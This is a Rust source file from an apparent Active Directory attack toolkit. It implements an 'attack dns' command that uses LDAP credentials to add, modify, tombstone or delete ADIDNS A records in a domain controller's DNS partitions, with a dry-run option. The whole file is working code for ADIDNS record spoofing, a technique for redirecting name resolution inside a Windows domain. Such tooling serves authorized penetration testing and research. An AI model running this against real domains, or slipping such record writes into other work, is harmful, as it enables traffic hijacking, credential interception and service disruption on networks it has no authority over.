//! WS-G / WS-13-CLI — `attack dns`: ADIDNS record write (add / modify / tombstone / delete).
//!
//! The DNS_RPC_RECORD wire blob is built by `adhammer_collector::dns_record::build_a_record`
//! (MS-DNSP §2.2.2.2.1, landed 1.4.2 as WS-13 prep). This module is the CLI + LDAP-write
//! side: it resolves the ADIDNS record DN under the `DomainDnsZones` (or `ForestDnsZones`)
//! application partition and applies the change through the existing `Collector` surface.
//! Every write gates on `--dry-run` (default-safe).

use adhammer_collector::dns_record;
use adhammer_collector::{Collector, LdapConfig};
use anyhow::{Context, Result};
use clap::Parser;
use std::net::Ipv4Addr;

/// The ADIDNS write to perform.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum DnsAction {
    /// Create a new A record (a `dnsNode` object carrying a `dnsRecord` blob).
    AddA,
    /// Replace the `dnsRecord` blob on an existing A node with a new address.
    ModifyA,
    /// Soft-delete: set `dnsTombstoned=TRUE` on the node.
    Tombstone,
    /// Hard-delete: remove the `dnsNode` object via LDAP delete.
    Delete,
}

#[derive(Parser)]
pub(crate) struct DnsArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::OptAuth,
    /// Which DNS write to perform.
    #[arg(long)]
    pub action: DnsAction,
    /// Record name — relative (`www`) or FQDN (`www.corp.local`); the zone suffix is stripped.
    #[arg(long)]
    pub name: String,
    /// IPv4 address for `add-a` / `modify-a`.
    #[arg(long, default_value = "")]
    pub ip: String,
    /// DNS zone FQDN. Default: derived from the bind base DN
    /// (`DC=corp,DC=local` → `corp.local`).
    #[arg(long)]
    pub zone: Option<String>,
    /// Target the `ForestDnsZones` partition instead of `DomainDnsZones`.
    #[arg(long)]
    pub forest: bool,
    /// Record TTL in seconds (`add-a` / `modify-a`).
    #[arg(long, default_value_t = 3600)]
    pub ttl: u32,
    /// Print the intended write and return without touching the DC. Every action honours it.
    #[arg(long)]
    pub dry_run: bool,
}

pub(crate) async fn dns(mut a: DnsArgs) -> Result<()> {
    {
        let cur = a.auth.password.as_deref().unwrap_or("");
        let resolved = crate::resolve_secret(cur, "ADHAMMER_PASSWORD")?;
        if !resolved.is_empty() {
            a.auth.password = Some(resolved);
        }
    }
    let cfg = LdapConfig {
        url: a
            .auth
            .url
            .clone()
            .context("attack dns needs --url (ldaps://dc:636)")?,
        bind_dn: a.auth.user.clone().context("attack dns needs --user")?,
        password: a
            .auth
            .password
            .clone()
            .context("attack dns needs --password")?,
        base_dn: None,
        allow_plaintext_bind: false,
        insecure: a.auth.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let base = c.base_dn().to_string();
    let zone = a.zone.clone().unwrap_or_else(|| zone_from_base(&base));
    let partition = if a.forest {
        "ForestDnsZones"
    } else {
        "DomainDnsZones"
    };
    let record = strip_zone_suffix(&a.name, &zone);
    let dn = format!("DC={record},DC={zone},CN=MicrosoftDNS,DC={partition},{base}");

    match a.action {
        DnsAction::AddA | DnsAction::ModifyA => {
            let ip: Ipv4Addr =
                a.ip.parse()
                    .with_context(|| format!("--ip {:?} is not an IPv4 address", a.ip))?;
            // Reuse the zone SOA's serial where we can read it; the DC re-stamps it on the
            // next zone update, so `1` is a safe fallback for a fresh write.
            let serial = read_zone_serial(&mut c, &zone, partition, &base)
                .await
                .unwrap_or(1);
            let blob = dns_record::build_a_record(&ip, a.ttl, serial);
            if a.dry_run {
                println!(
                    "[dry-run] would write attribute=dnsRecord target={dn} \
                     value=<A {ip}, ttl={}, {}-byte DNS_RPC_RECORD>",
                    a.ttl,
                    blob.len()
                );
                println!("[dry-run] no change made");
                return Ok(());
            }
            if a.action == DnsAction::AddA {
                let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
                    ("objectClass", vec![b"top".to_vec(), b"dnsNode".to_vec()]),
                    ("dc", vec![record.as_bytes().to_vec()]),
                    ("dnsRecord", vec![blob.clone()]),
                ];
                match c.add_object(&dn, attrs).await {
                    Ok(()) => println!("[+] created A record {record}.{zone} → {ip}"),
                    // Node already exists (or add refused) — fall back to replacing the blob;
                    // a genuine access error re-surfaces from write_binary below.
                    Err(_) => {
                        c.write_binary(&dn, "dnsRecord", blob).await?;
                        println!("[+] node existed — replaced dnsRecord on {record}.{zone} → {ip}");
                    }
                }
            } else {
                c.write_binary(&dn, "dnsRecord", blob).await?;
                println!("[+] modified A record {record}.{zone} → {ip}");
            }
        }
        DnsAction::Tombstone => {
            if a.dry_run {
                println!("[dry-run] would write attribute=dnsTombstoned target={dn} value=TRUE");
                println!("[dry-run] no change made");
                return Ok(());
            }
            c.modify_replace(&dn, "dnsTombstoned", "TRUE").await?;
            println!("[+] tombstoned {record}.{zone} (dnsTombstoned=TRUE)");
        }
        DnsAction::Delete => {
            if a.dry_run {
                println!("[dry-run] would delete object target={dn}");
                println!("[dry-run] no change made");
                return Ok(());
            }
            c.delete_object(&dn).await?;
            println!("[+] deleted DNS node {record}.{zone}");
        }
    }
    Ok(())
}

/// `DC=corp,DC=local` → `corp.local` — the default zone is the domain's own DNS name.
fn zone_from_base(base: &str) -> String {
    base.split(',')
        .filter_map(|p| {
            let p = p.trim();
            p.strip_prefix("DC=").or_else(|| p.strip_prefix("dc="))
        })
        .collect::<Vec<_>>()
        .join(".")
}

/// Strip a trailing `.<zone>` from an FQDN record name, leaving the zone-relative label.
fn strip_zone_suffix(name: &str, zone: &str) -> String {
    let n = name.trim_end_matches('.');
    let suffix = format!(".{zone}");
    n.strip_suffix(suffix.as_str()).unwrap_or(n).to_string()
}

/// Read the zone SOA serial from the `@` node's `dnsRecord` (best-effort; `None` on any miss).
async fn read_zone_serial(
    c: &mut Collector,
    zone: &str,
    partition: &str,
    base: &str,
) -> Option<u32> {
    let soa_dn = format!("DC=@,DC={zone},CN=MicrosoftDNS,DC={partition},{base}");
    let blob = c.read_binary(&soa_dn, "dnsRecord").await.ok()??;
    dns_record::read_soa_serial(&blob)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn zone_derivation() {
        assert_eq!(zone_from_base("DC=corp,DC=local"), "corp.local");
        assert_eq!(zone_from_base("dc=testlab,dc=local"), "testlab.local");
    }

    #[test]
    fn suffix_stripping() {
        assert_eq!(strip_zone_suffix("www.corp.local", "corp.local"), "www");
        assert_eq!(strip_zone_suffix("www", "corp.local"), "www");
        assert_eq!(strip_zone_suffix("a.b.corp.local", "corp.local"), "a.b");
    }
}
